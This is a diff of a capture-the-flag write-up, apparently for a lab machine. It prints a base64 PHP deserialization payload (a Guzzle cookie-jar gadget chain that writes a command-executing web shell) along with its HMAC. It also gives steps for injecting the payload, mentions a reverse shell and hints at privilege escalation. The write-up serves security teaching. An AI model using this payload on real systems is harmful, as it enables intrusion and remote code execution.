@@ -202,6 +202,10 @@ php ~/thm/enterprize/generate_hmac.php
 YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vc2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fWk6NztpOjc7fQ==63624213e24dd952ec588b4d75a6aaad32f0e636
 ```
 
-Intercept the request of your form submition and paste payload + hmac in \__state field. Now, we have RCE at \`/fileadmin/\_temp\_/shell.php\`._
+Intercept the request of your form submition and paste payload + hmac in state field. Now, we have RCE at `/var/www/html/public/fileadmin/_temp_/shell.php`.
+
+For some reason, my ip was blocked by target machine, so i switched vpn and got reverse shell with simple curl and bash reverse shell in shell.sh.
 
 ## Privilege escalation
+
+Exploring john home directory found binary file myapp that loads `/usr/bin/libcustom.so`. Exfiltrate myapp and libcustom.so to your machine for further analysis.
